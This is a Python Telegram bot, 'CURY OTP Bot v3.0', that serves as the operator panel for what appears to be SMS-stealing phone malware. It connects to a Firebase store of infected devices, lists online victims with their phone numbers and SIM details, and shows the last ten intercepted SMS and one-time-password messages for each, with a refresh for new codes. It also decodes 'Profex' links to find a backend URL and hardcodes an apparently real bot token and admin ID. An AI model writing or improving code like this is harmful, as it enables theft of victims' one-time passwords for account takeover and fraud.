import os
import json
import time
import base64
import requests
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============================================================
# 🔧 CONFIG – Railway se environment variables lo
# ============================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8898877734:AAG56WKI1hE4zPQZtW-WPGV_FyMJtWlFqc8")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8739344756"))

# ============================================================
# 📦 GLOBAL STORE
# ============================================================
user_data_store = {}

# ============================================================
# 🔧 FIREBASE HELPERS
# ============================================================
def fb_get(user_id, path):
    data = user_data_store.get(user_id, {})
    firebase_url = data.get('firebase_url')
    api_key = data.get('api_key')
    if not firebase_url or not api_key:
        return None
    if not firebase_url.endswith('/'):
        firebase_url += '/'
    url = f"{firebase_url}{path}.json?auth={api_key}"
    try:
        resp = requests.get(url, timeout=10)
        return resp.json() if resp.status_code == 200 else None
    except:
        return None

def fb_put(user_id, path, payload):
    data = user_data_store.get(user_id, {})
    firebase_url = data.get('firebase_url')
    api_key = data.get('api_key')
    if not firebase_url or not api_key:
        return None
    if not firebase_url.endswith('/'):
        firebase_url += '/'
    url = f"{firebase_url}{path}.json?auth={api_key}"
    try:
        resp = requests.put(url, json=payload, timeout=10)
        return resp.json() if resp.status_code == 200 else None
    except:
        return None

# ============================================================
# 🏠 MAIN MENU KEYBOARD
# ============================================================
def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("📱 Online Devices", callback_data="menu_devices")],
        [InlineKeyboardButton("🔗 Set Firebase", callback_data="menu_set_firebase")],
        [InlineKeyboardButton("🔗 Set Profex", callback_data="menu_set_profex")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ============================================================
# 🚀 /start COMMAND
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    await update.message.reply_text(
        "🤖 *CURY OTP Bot v3.0*\n\n"
        "Welcome! Use the buttons below to control the bot.\n\n"
        "📌 *Features:*\n"
        "• View online devices\n"
        "• Get device info (phone, SIM, last seen)\n"
        "• See last 10 OTP/SMS messages\n"
        "• Refresh to get latest messages\n"
        "• Connect Firebase or Profex",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

# ============================================================
# 🔗 SET FIREBASE (Command + Callback)
# ============================================================
async def set_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ Usage: `/set_firebase <URL> <API_KEY>`\n\n"
            "Example:\n"
            "`/set_firebase https://xxx.firebaseio.com/ AIzaSyDummyKey`",
            parse_mode="Markdown"
        )
        return
    
    firebase_url = args[0].strip()
    api_key = args[1].strip()
    
    if not firebase_url.endswith('/'):
        firebase_url += '/'
    
    # Test connection
    test_url = f"{firebase_url}.json?auth={api_key}"
    try:
        resp = requests.get(test_url, timeout=5)
        if resp.status_code != 200:
            await update.message.reply_text(f"❌ Connection failed! Status: {resp.status_code}")
            return
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        return
    
    user_data_store[user_id] = {
        "firebase_url": firebase_url,
        "api_key": api_key,
        "current_phone": None,
        "current_device_id": None
    }
    
    await update.message.reply_text(
        f"✅ *Firebase Connected!*\n\n"
        f"📡 URL: `{firebase_url}`\n"
        f"🔑 API Key: `{api_key[:10]}...`",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

async def set_firebase_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🔗 *Set Firebase*\n\n"
        "Send command:\n"
        "`/set_firebase <URL> <API_KEY>`\n\n"
        "Example:\n"
        "`/set_firebase https://xxx.firebaseio.com/ AIzaSyDummyKey`",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

# ============================================================
# 🔗 SET PROfEX
# ============================================================
async def set_profex_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            "❌ Usage: `/set_profex <PROFEX_LINK>`\n\n"
            "Example:\n"
            "`/set_profex https://profex.site.je/?s=...`",
            parse_mode="Markdown"
        )
        return
    
    profex_link = args[0].strip()
    
    try:
        if '?s=' in profex_link:
            encoded = profex_link.split('?s=')[1]
            decoded = base64.b64decode(encoded).decode('utf-8')
            if '||' in decoded:
                firebase_url = decoded.split('||')[0]
            else:
                firebase_url = decoded
        else:
            firebase_url = profex_link
        
        if not firebase_url.endswith('/'):
            firebase_url += '/'
        
        await update.message.reply_text(
            f"✅ *Profex Decoded!*\n\n"
            f"📡 Firebase URL: `{firebase_url}`\n\n"
            f"⚠️ Now send your API Key:\n"
            f"`/set_firebase {firebase_url} YOUR_API_KEY`",
            reply_markup=get_main_menu(),
            parse_mode="Markdown"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}", reply_markup=get_main_menu())

async def set_profex_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🔗 *Set Profex*\n\n"
        "Send command:\n"
        "`/set_profex <PROFEX_LINK>`\n\n"
        "Example:\n"
        "`/set_profex https://profex.site.je/?s=...`",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

# ============================================================
# 📱 DEVICES LIST
# ============================================================
async def devices_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    if user_id not in user_data_store or not user_data_store[user_id].get('firebase_url'):
        await query.edit_message_text(
            "❌ Firebase not connected.\nUse 'Set Firebase' button first.",
            reply_markup=get_main_menu()
        )
        return
    
    devices_data = fb_get(user_id, "devices")
    if not devices_data:
        await query.edit_message_text(
            "❌ No devices found or Firebase error.",
            reply_markup=get_main_menu()
        )
        return
    
    now = int(time.time())
    online_list = []
    for device_id, info in devices_data.items():
        last_seen = info.get('last_seen', 0)
        if now - last_seen <= 10:
            online_list.append({
                "device_id": device_id,
                "phone": info.get('phone', 'N/A'),
                "sim": info.get('sim', 'N/A'),
                "device_name": info.get('device_name', device_id[:8]),
                "last_seen": last_seen
            })
    
    if not online_list:
        await query.edit_message_text(
            "📱 No online devices.",
            reply_markup=get_main_menu()
        )
        return
    
    keyboard = []
    for dev in online_list:
        btn_text = f"📱 {dev['device_name']} ({dev['phone']})"
        callback_data = f"info_{dev['device_id']}"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=callback_data)])
    
    keyboard.append([InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📱 *Online Devices: {len(online_list)}*\n\nTap a device to see info.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

# ============================================================
# ℹ️ DEVICE INFO (Callback)
# ============================================================
async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    device_id = query.data.replace('info_', '')
    
    devices_data = fb_get(user_id, "devices")
    if not devices_data or device_id not in devices_data:
        await query.edit_message_text("❌ Device not found.", reply_markup=get_main_menu())
        return
    
    info = devices_data[device_id]
    phone = info.get('phone', 'N/A')
    sim = info.get('sim', 'N/A')
    device_name = info.get('device_name', 'Unknown')
    last_seen = info.get('last_seen', 0)
    
    user_data_store[user_id]['current_phone'] = phone
    user_data_store[user_id]['current_device_id'] = device_id
    
    msg = (
        f"ℹ️ *Device Info*\n\n"
        f"📱 Name: {device_name}\n"
        f"📞 Phone: {phone}\n"
        f"📇 SIM: {sim}\n"
        f"🕐 Last Seen: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(last_seen))}\n"
        f"🟢 Status: Online"
    )
    
    keyboard = [
        [InlineKeyboardButton("📜 Seen OTP (Last 10)", callback_data=f"seen_{phone}")],
        [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh_{phone}")],
        [InlineKeyboardButton("🔙 Back to Devices", callback_data="menu_devices")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode="Markdown")

# ============================================================
# 📜 SEEN OTP (Callback)
# ============================================================
async def seen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    phone = query.data.replace('seen_', '')
    
    history_path = f"device_sms/{phone}"
    messages = fb_get(user_id, history_path)
    
    if not messages:
        await query.edit_message_text(
            f"📭 No messages found for {phone}",
            reply_markup=get_main_menu()
        )
        return
    
    msg_list = []
    for msg_id, msg_data in messages.items():
        msg_list.append({
            "text": msg_data.get('text', ''),
            "from": msg_data.get('from', 'Unknown'),
            "timestamp": msg_data.get('timestamp', 0)
        })
    
    msg_list.sort(key=lambda x: x['timestamp'], reverse=True)
    last_10 = msg_list[:10]
    
    if not last_10:
        await query.edit_message_text(f"📭 No messages found for {phone}")
        return
    
    response = f"📜 *Last 10 Messages for {phone}*\n\n"
    for i, msg in enumerate(last_10, 1):
        time_str = time.strftime('%H:%M:%S', time.localtime(msg['timestamp']))
        response += f"{i}. 📨 {msg['text']}\n   From: {msg['from']} · {time_str}\n\n"
    
    device_id = user_data_store.get(user_id, {}).get('current_device_id')
    keyboard = []
    if device_id:
        keyboard.append([InlineKeyboardButton("🔙 Back to Device", callback_data=f"info_{device_id}")])
    keyboard.append([InlineKeyboardButton("📱 Devices", callback_data="menu_devices")])
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(response, reply_markup=reply_markup, parse_mode="Markdown")

# ============================================================
# 🔄 REFRESH (Callback)
# ============================================================
async def refresh_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    phone = query.data.replace('refresh_', '')
    
    history_path = f"device_sms/{phone}"
    messages = fb_get(user_id, history_path)
    
    if not messages:
        await query.edit_message_text(f"📭 No messages found for {phone}")
        return
    
    msg_list = []
    for msg_id, msg_data in messages.items():
        msg_list.append({
            "text": msg_data.get('text', ''),
            "from": msg_data.get('from', 'Unknown'),
            "timestamp": msg_data.get('timestamp', 0)
        })
    
    msg_list.sort(key=lambda x: x['timestamp'], reverse=True)
    last_10 = msg_list[:10]
    
    if not last_10:
        await query.edit_message_text(f"📭 No messages found for {phone}")
        return
    
    response = f"🔄 *Refreshed – Latest Messages for {phone}*\n\n"
    for i, msg in enumerate(last_10, 1):
        time_str = time.strftime('%H:%M:%S', time.localtime(msg['timestamp']))
        is_new = " 🔵 NEW" if i == 1 else ""
        response += f"{i}. 📨 {msg['text']}{is_new}\n   From: {msg['from']} · {time_str}\n\n"
    
    device_id = user_data_store.get(user_id, {}).get('current_device_id')
    keyboard = []
    if device_id:
        keyboard.append([InlineKeyboardButton("🔙 Back to Device", callback_data=f"info_{device_id}")])
    keyboard.append([InlineKeyboardButton("📱 Devices", callback_data="menu_devices")])
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(response, reply_markup=reply_markup, parse_mode="Markdown")

# ============================================================
# 🏠 MAIN MENU (Callback)
# ============================================================
async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🤖 *CURY OTP Bot v3.0*\n\n"
        "Choose an option below:",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

# ============================================================
# ℹ️ HELP (Callback)
# ============================================================
async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📖 *Help Guide*\n\n"
        "1. First connect Firebase using 'Set Firebase' or 'Set Profex'\n"
        "2. Click 'Online Devices' to see all online devices\n"
        "3. Tap any device to see its info (phone, SIM, last seen)\n"
        "4. Use 'Seen OTP' to see last 10 messages\n"
        "5. Use 'Refresh' to get latest messages (new ones appear on top)\n\n"
        "📌 *Commands also work:*\n"
        "`/devices`, `/info <id>`, `/seen <phone>`, `/refresh`",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

# ============================================================
# 📱 /devices COMMAND
# ============================================================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Same as devices_callback but for /command
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if user_id not in user_data_store or not user_data_store[user_id].get('firebase_url'):
        await update.message.reply_text("❌ Firebase not connected. Use /set_firebase first.")
        return
    
    devices_data = fb_get(user_id, "devices")
    if not devices_data:
        await update.message.reply_text("❌ No devices found.")
        return
    
    now = int(time.time())
    online_list = []
    for device_id, info in devices_data.items():
        last_seen = info.get('last_seen', 0)
        if now - last_seen <= 10:
            online_list.append({
                "device_id": device_id,
                "phone": info.get('phone', 'N/A'),
                "device_name": info.get('device_name', device_id[:8]),
            })
    
    if not online_list:
        await update.message.reply_text("📱 No online devices.")
        return
    
    keyboard = []
    for dev in online_list:
        btn_text = f"📱 {dev['device_name']} ({dev['phone']})"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"info_{dev['device_id']}")])
    
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"📱 *Online Devices: {len(online_list)}*",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

# ============================================================
# 🚀 MAIN
# ============================================================
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("set_firebase", set_firebase_command))
    application.add_handler(CommandHandler("set_profex", set_profex_command))
    application.add_handler(CommandHandler("devices", devices_command))
    
    # Callbacks (Menu)
    application.add_handler(CallbackQueryHandler(main_menu_callback, pattern="^menu_main$"))
    application.add_handler(CallbackQueryHandler(devices_callback, pattern="^menu_devices$"))
    application.add_handler(CallbackQueryHandler(set_firebase_callback, pattern="^menu_set_firebase$"))
    application.add_handler(CallbackQueryHandler(set_profex_callback, pattern="^menu_set_profex$"))
    application.add_handler(CallbackQueryHandler(help_callback, pattern="^menu_help$"))
    
    # Callbacks (Actions)
    application.add_handler(CallbackQueryHandler(info_callback, pattern="^info_"))
    application.add_handler(CallbackQueryHandler(seen_callback, pattern="^seen_"))
    application.add_handler(CallbackQueryHandler(refresh_callback, pattern="^refresh_"))
    
    print("🤖 CURY OTP Bot v3.0 is running...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
